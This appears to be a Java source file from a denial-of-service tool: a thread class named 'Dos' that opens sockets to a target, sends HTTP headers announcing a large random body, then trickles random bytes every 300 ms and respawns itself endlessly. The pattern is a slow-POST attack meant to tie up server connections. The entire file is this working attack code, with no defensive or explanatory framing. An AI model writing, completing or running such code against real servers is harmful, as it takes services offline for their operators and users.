import java.net.Socket;
import java.net.SocketException;
import java.util.Random;

public class Dos extends Thread {
    private static final Random rnd = new Random();
    private static int threadsCount = -1;

    @Override
    public void run() {
        System.out.println(String.format("%s started", getName()));
        try {
            int contentLength = rnd.nextInt(25000);
            Socket socket = Main.createNewSocket();
            if (socket == null) {
                restart();
                return;
            }
            Writer w = new Writer(socket.getOutputStream());

            for (int i = 0; i < Main.headers.length - 1; i++) {
                w.writeLine(Main.headers[i]);
            }

            w.writeLine(Main.headers[9] + contentLength);
            w.writeLine("");
            w.writeLine("");

            for (int i = 0; i < contentLength; i++) {
                w.write((char) (rnd.nextInt(255)) + "");
                Thread.sleep(300);
            }

            socket.close();
            restart();
        } catch (SocketException t) {
            restart();
        } catch (Throwable t) {
            t.printStackTrace();
            restart();
        }
    }

    private void restart() {
        try {
            new Dos().start();
            interrupt();
        } catch (OutOfMemoryError t) {
            System.out.println("Out of memory!");
        }
    }
}
